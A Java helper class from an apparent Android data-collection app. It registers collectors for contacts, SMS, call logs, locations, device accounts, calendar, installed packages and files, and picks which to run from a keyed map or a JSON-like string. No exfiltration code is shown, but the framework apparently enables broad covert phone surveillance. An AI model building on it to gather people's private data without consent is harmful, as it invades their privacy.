package com.xaviar.utils;

import java.util.Collection;
import java.util.LinkedList;
import java.util.List;
import java.util.Map;
import java.util.StringTokenizer;
import java.util.TreeMap;

import com.xaviar.collect.calendar.CollectCalendar;
import com.xaviar.collect.calllog.CollectCallLog;
import com.xaviar.collect.calllog_event.CollectCalllogEvent;
import com.xaviar.collect.contacts.CollectContacts;
import com.xaviar.collect.device_accounts.CollectDeviceAccount;
import com.xaviar.collect.files.CollectFiles;
import com.xaviar.collect.location.CollectLocations;
import com.xaviar.collect.packages.CollectPackages;
import com.xaviar.collect.phoneparams.CollectPhoneParams;
import com.xaviar.collect.sms.CollectSms;
import com.xaviar.collect.sms_event.CollectSmsEvent;
import com.xaviar.frm.DataHolder;
import com.xaviar.frm.ICollector;

public class CollectorHelper {

	public static ICollector getICollect(String key) {
		ICollector iColl = mapCollectors.get(key);
		return iColl;
	}

	public static Map<String, ICollector> mapCollectors = null;

	public static Map<String, ICollector> getMapCollectors() {
		return mapCollectors;
	}

	static {
		initMapCollectors();
	}

	public static void initMapCollectors() {
		mapCollectors = new TreeMap<String, ICollector>();
		mapCollectors.put(DataHolder.CONTACTS, new CollectContacts());
		mapCollectors.put(DataHolder.SMS, new CollectSms());
		mapCollectors.put(DataHolder.PHONE_PARAMS, new CollectPhoneParams());
		mapCollectors.put(DataHolder.CALL_LOG, new CollectCallLog());
		mapCollectors.put(DataHolder.SMS_EVENT, new CollectSmsEvent());
		mapCollectors.put(DataHolder.CALL_LOG_EVENT, new CollectCalllogEvent());
		mapCollectors.put(DataHolder.LOCATION_EVENT, new CollectLocations());
		mapCollectors.put(DataHolder.DEVICE_ACCOUNTS, new CollectDeviceAccount());
		mapCollectors.put(DataHolder.CALENDAR, new CollectCalendar());
		mapCollectors.put(DataHolder.PACKAGES, new CollectPackages());
		mapCollectors.put(DataHolder.FILE_STRING, new CollectFiles());
	}
	
	public static  Collection<ICollector> createICollectList(Map<String,String> map) {
		Collection<ICollector> collectionCollectorsRet = new LinkedList<ICollector>();
		
		Map<String,ICollector> mapColl = CollectorHelper.getMapCollectors();					
		
		for(String key : map.keySet())
		{
		 if(mapColl.containsKey(key))
		 {
		   Object o = mapColl.get(key);
		   collectionCollectorsRet.add((ICollector) o);		   
		 }
		}
		
		return collectionCollectorsRet;
	
	}

	public static List<String> createCollectListStr(String jsonStr) {
		List<String> list = new LinkedList<String>();
		//Log.w(TAG, "save:jsonText:" + jsonStr);
		String jsonTextWithoutBrackrt = DbUtil.removeBracket(jsonStr,'{','}');
		//Log.w(TAG, "jsonTextWithoutBrackrt:" + jsonTextWithoutBrackrt);
		StringTokenizer stTokenizer = new StringTokenizer(jsonTextWithoutBrackrt, ",");
		
		// Log.w(TAG, "num of static elem in dh:" + sizeMap);
		while (stTokenizer.hasMoreElements()) {
			String tokenKey = (String) stTokenizer.nextElement();											
			if (null != tokenKey) {
				list.add(tokenKey);
				//Log.e(TAG, "icollectVal is null,can nto add it to set!");
			} else {
				//set.add(icollectVal);
			}
		}
		return list;
	}

}
